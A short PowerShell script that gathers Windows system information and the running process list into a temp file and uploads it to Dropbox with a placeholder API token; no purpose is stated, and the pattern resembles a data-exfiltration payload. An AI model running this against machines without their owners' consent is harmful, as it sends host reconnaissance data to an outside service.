$dropboxToken = "your-token-here"
$outputFile = "$env:temp\systeminfo.txt"
systeminfo > $outputFile
Add-Content -Path $outputFile -Value "`n===== Running Processes =====`n"
Get-Process | Out-File -FilePath $outputFile -Append
Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" `
    -Headers @{
        "Authorization" = "Bearer $dropboxToken";
        "Dropbox-API-Arg" = '{"path": "/systeminfo.txt", "mode": "overwrite"}';
        "Content-Type" = "application/octet-stream"
    } `
    -Method Post -InFile $outputFile
